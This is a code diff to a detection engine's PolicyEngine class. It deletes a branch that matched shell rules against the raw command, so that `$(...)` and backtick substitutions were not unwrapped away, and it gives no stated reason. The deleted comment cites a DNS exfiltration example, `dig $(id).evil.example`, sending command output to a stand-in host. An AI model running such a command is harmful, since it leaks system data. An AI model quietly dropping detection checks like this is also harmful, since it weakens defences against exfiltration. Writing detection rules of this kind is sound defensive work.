@@ -1710,17 +1710,6 @@ class PolicyEngine:
                         evasion = "shell_quote_obfuscation"
                         break
 
-            if (matched_evidence is None and event_type == "shell"
-                    and rule.condition is None and "command" in check_fields):
-                # The normalized field unwraps `$(...)` and backticks, so a
-                # rule written against the substitution itself
-                # (dns-exfiltration: `dig $(id).evil.example`) never sees one.
-                # Check the raw command for those rules.
-                raw_command = str(event.get("command") or "")
-                if (("$(" in raw_command or "`" in raw_command)
-                        and rule.patterns.search(raw_command)):
-                    matched_evidence = field_values.get("command", "")
-
             if matched_evidence is None:
                 continue
 
